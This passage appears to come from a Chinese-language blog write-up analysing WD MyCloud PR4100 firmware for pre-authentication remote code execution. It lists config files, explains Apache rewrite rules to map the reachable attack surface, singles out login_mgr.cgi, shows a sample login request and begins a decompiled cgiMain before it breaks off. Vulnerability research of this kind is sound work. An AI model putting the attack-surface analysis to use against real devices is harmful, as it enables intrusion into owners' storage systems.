class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;Desktop&#x2F;WDMyCloud_PR4100_GPL_v2.40.155_20200713$ find . -name &quot;*.conf&quot;</span><br><span class="line">.&#x2F;firmware&#x2F;ramdisk&#x2F;root&#x2F;etc&#x2F;mdev.conf</span><br><span class="line">.&#x2F;firmware&#x2F;ramdisk&#x2F;root&#x2F;etc&#x2F;ez-ipupdate.conf</span><br><span class="line">.&#x2F;firmware&#x2F;ramdisk&#x2F;root&#x2F;etc&#x2F;alert_email.conf</span><br><span class="line">.&#x2F;firmware&#x2F;ramdisk&#x2F;root&#x2F;etc&#x2F;ld.so.conf</span><br><span class="line">.&#x2F;firmware&#x2F;ramdisk&#x2F;root&#x2F;etc&#x2F;avahi&#x2F;avahi-daemon.conf</span><br><span class="line">.&#x2F;firmware&#x2F;ramdisk&#x2F;root&#x2F;etc&#x2F;netatalk&#x2F;extmap.conf</span><br><span class="line">.&#x2F;firmware&#x2F;ramdisk&#x2F;root&#x2F;etc&#x2F;nsswitch.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;config&#x2F;default_lighttpd.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;config&#x2F;php-fpm.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2_dav&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2_dav&#x2F;conf&#x2F;extra&#x2F;httpd-languages.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2_dav&#x2F;conf&#x2F;extra&#x2F;httpd-dav.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2_dav&#x2F;conf&#x2F;extra&#x2F;httpd-autoindex.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2_dav&#x2F;conf&#x2F;extra&#x2F;httpd-manual.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2_dav&#x2F;conf&#x2F;extra&#x2F;httpd-multilang-errordoc.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2_dav&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2_dav&#x2F;conf&#x2F;extra&#x2F;httpd-userdir.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2_dav&#x2F;conf&#x2F;extra&#x2F;httpd-info.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2_dav&#x2F;conf&#x2F;extra&#x2F;httpd-ssl.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2_dav&#x2F;conf&#x2F;extra&#x2F;httpd-default.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2_dav&#x2F;conf&#x2F;extra&#x2F;httpd-mpm.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;certconf&#x2F;wdnas-rest-api.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;certconf&#x2F;wdnas-rest-api-trusted.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;sites-enabled&#x2F;restsdk.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;sites-enabled&#x2F;wdnas-ui.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;available&#x2F;httpd-languages.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;available&#x2F;httpd-dav.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;available&#x2F;httpd-autoindex.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;available&#x2F;httpd-manual.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;available&#x2F;httpd-multilang-errordoc.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;available&#x2F;httpd-vhosts.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;available&#x2F;httpd-userdir.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;available&#x2F;httpd-info.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;ports.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-default.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;wdapp_web.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;mime.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;flvx.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;env.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;dav_fs.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;unixd.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;autoindex.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;mime_magic.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;log_config.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;dir.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;rewrite.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;alpha_custom.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;security2.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;actions.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;cgi.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;deflate.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;alias.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;mpm_prefork.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;negotiation.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;logio.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;setenvif.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;ssl.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;headers.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;php5.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;mods-enabled&#x2F;xsendfile.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;modsecurity.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-942-APPLICATION-ATTACK-SQLI.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;RESPONSE-951-DATA-LEAKAGES-SQL.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-930-APPLICATION-ATTACK-LFI.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-931-APPLICATION-ATTACK-RFI.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-949-BLOCKING-EVALUATION.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-911-METHOD-ENFORCEMENT.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;RESPONSE-954-DATA-LEAKAGES-IIS.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-903.9002-WORDPRESS-EXCLUSION-RULES.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-933-APPLICATION-ATTACK-PHP.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-910-IP-REPUTATION.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-901-INITIALIZATION.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;RESPONSE-959-BLOCKING-EVALUATION.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;RESPONSE-952-DATA-LEAKAGES-JAVA.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;RESPONSE-953-DATA-LEAKAGES-PHP.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;RESPONSE-950-DATA-LEAKAGES.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-920-PROTOCOL-ENFORCEMENT.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-905-COMMON-EXCEPTIONS.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-921-PROTOCOL-ATTACK.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-932-APPLICATION-ATTACK-RCE.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-913-SCANNER-DETECTION.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-912-DOS-PROTECTION.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-903.9001-DRUPAL-EXCLUSION-RULES.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;RESPONSE-980-CORRELATION.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;REQUEST-941-APPLICATION-ATTACK-XSS.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;web&#x2F;apache2&#x2F;conf&#x2F;modsecurity&#x2F;crs-setup.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;dbus-1&#x2F;system.d&#x2F;avahi-dbus.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;dbus-1&#x2F;system.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;etc&#x2F;smtp.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;etc&#x2F;nas&#x2F;wdnotifier.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;etc&#x2F;nas&#x2F;notify.d&#x2F;wdmcserver.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;etc&#x2F;nas&#x2F;notify.d&#x2F;wddispatcher.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;wdnas-rest-api.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;wdnas-ui.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;wdnas-rest-api-trusted.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;etc&#x2F;apache2&#x2F;conf.d&#x2F;orionversion.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;etc&#x2F;rsyslog.d&#x2F;wdlog.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;etc&#x2F;rsyslog.d&#x2F;wddispatcher.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;default&#x2F;syslog.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;default&#x2F;mt-daapd.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;default&#x2F;wdlog.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;default&#x2F;dhcp6c.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;default&#x2F;udhcpd.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;default&#x2F;resolv.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;default&#x2F;routeap.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;default&#x2F;s3.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;default&#x2F;snmpd.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;default&#x2F;gogoc.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;apache2&#x2F;sites-available&#x2F;wdnas-rest-api.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;apache2&#x2F;sites-available&#x2F;wdnas-ui.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;apache2&#x2F;conf.d&#x2F;orionversion.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;files&#x2F;ups&#x2F;upsd.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;files&#x2F;ups&#x2F;upssched.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;files&#x2F;ups&#x2F;upsmon.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;files&#x2F;ups&#x2F;ups.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;files&#x2F;syslog_rotate.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;files&#x2F;mke2fs.conf</span><br><span class="line">.&#x2F;firmware&#x2F;module&#x2F;crfs&#x2F;files&#x2F;syslog_dai</span><br></pre></td></tr></table></figure><ul><li><p><code>alias.conf</code><br><a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_alias.html" target="_blank" rel="noopener">https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_alias.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ScriptAlias &#x2F;cgi-bin&#x2F; &#x2F;var&#x2F;www&#x2F;cgi-bin&#x2F;</span><br></pre></td></tr></table></figure><p>这句配置的含义是把web请求的url中，如果它访问的目录是<code>/cgi-bin/</code>，就重定向到<code>/var/www/cgi-bin/</code>目录下。</p></li><li><p><code>rewrite.conf</code><br><a href="https://www.jianshu.com/p/103742cccaff" target="_blank" rel="noopener">https://www.jianshu.com/p/103742cccaff</a></p></li></ul><p>对于<code>rewrite.conf</code>，主要读懂RewriteCond和RewriteRule两个关键字的含义就行了。</p><p>RewriteCond起到的是过滤作用<br>以<code>RewriteCond %{REMOTE_ADDR} !^127\.0\.0\.1$</code>这句为例，如果<code>%{REMOTE_ADDR}</code>和<code>!^127\.0\.0\.1$</code>正则匹配，即<code>REMOTE_ADDR</code>不是来自localhost的话，就使用紧邻着的下一句RewriteRule来重定向web请求。<br>以<code>RewriteRule ^(\w*).cgi$ /web/cgi_api.php?cgi_name=$1&amp;%{QUERY_STRING} [L]</code>这句为例，就是把所有访问<code>xx.cgi</code>文件的请求，都重定向到<code>/web/cgi_api.php?cgi_name=xxx</code>，即用<code>cgi_api.php</code>来分发请求，如果鉴权不通过，就不能访问该cgi文件。</p><p>这里的鉴权主要指的就是攻击者是否有普通用户登录的权限，也就是一般说的pre-auth和after-auth了。</p><p>我们主要关注的都是pre-auth的rce，所以从这个配置文件和从<code>cgi_api.php</code>里的逻辑可以看出，认证前能够访问的cgi文件只有<code>webpipe.cgi</code>和<code>login_mgr.cgi</code>，而前者内部也有鉴权，所以主要关注<code>login_mgr.cgi</code></p><p>至此为止我们就分析出了攻击者易达的攻击面，如果要深挖的话还需要再读一下其他的配置文件，和<code>ps -ef</code>看看还开了哪些进程，能否通过httpd路由到。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule rewrite_module&gt;</span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond expr &quot;%&#123;REQUEST_URI&#125; !&#x3D; &#39;&#x2F;xml&#x2F;english.xml&#39;&quot;</span><br><span class="line">RewriteCond expr &quot;%&#123;REQUEST_URI&#125; !&#x3D; &#39;&#x2F;xml&#x2F;lang.xml&#39;&quot;</span><br><span class="line">RewriteRule ^&#x2F;xml&#x2F;(.*) &#x2F;cgi-bin&#x2F;webpipe.cgi</span><br><span class="line">#RewriteRule &#x2F;api&#x2F;[0-9.]+&#x2F;rest&#x2F;(.*)\?(.*)$ &#x2F;htdocs&#x2F;api&#x2F;rest&#x2F;index.php?$2</span><br><span class="line">#RewriteRule &#x2F;api&#x2F;[0-9.]+&#x2F;rest&#x2F;(.*)  &#x2F;htdocs&#x2F;api&#x2F;rest&#x2F;index.php</span><br><span class="line"></span><br><span class="line">RewriteCond %&#123;HTTP_HOST&#125; ^(.*)\.(:\d+)?$</span><br><span class="line">RewriteRule ^(.*)$ http:&#x2F;&#x2F;%1%2$1 [L,R&#x3D;301]</span><br><span class="line"></span><br><span class="line">&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;cgi-bin&#x2F;&quot;&gt;</span><br><span class="line">RewriteCond %&#123;REMOTE_ADDR&#125; !^127\.0\.0\.1$</span><br><span class="line">RewriteCond $1 !^abFiles$</span><br><span class="line">RewriteRule ^(\w*).cgi$ &#x2F;web&#x2F;cgi_api.php?cgi_name&#x3D;$1&amp;%&#123;QUERY_STRING&#125; [L]</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先抓包看一下正常的请求包是什么样的，可以看出用户输入的密码其实是被base64之后再发往server端处理的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;cgi-bin&#x2F;login_mgr.cgi HTTP&#x2F;1.1</span><br><span class="line">...</span><br><span class="line">Cookie: PHPSESSID&#x3D;058d44781ddc0be98f15233c8853476f; local_login&#x3D;1</span><br><span class="line">cmd&#x3D;wd_login&amp;username&#x3D;admin&amp;pwd&#x3D;YWRtaW4%3D&amp;port&#x3D;</span><br></pre></td></tr></table></figure><p>入口函数在cgiMain，该函数根据post请求里的cmd参数来选择使用哪个函数，这里我们主要看的就是<code>wd_login</code>函数</p><h3 id="cgiMain"><a href="#cgiMain" class="headerlink" title="cgiMain"></a>cgiMain</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">cgiMain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> v0; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v2; <span class="comment">// rcx</span></span><br><span 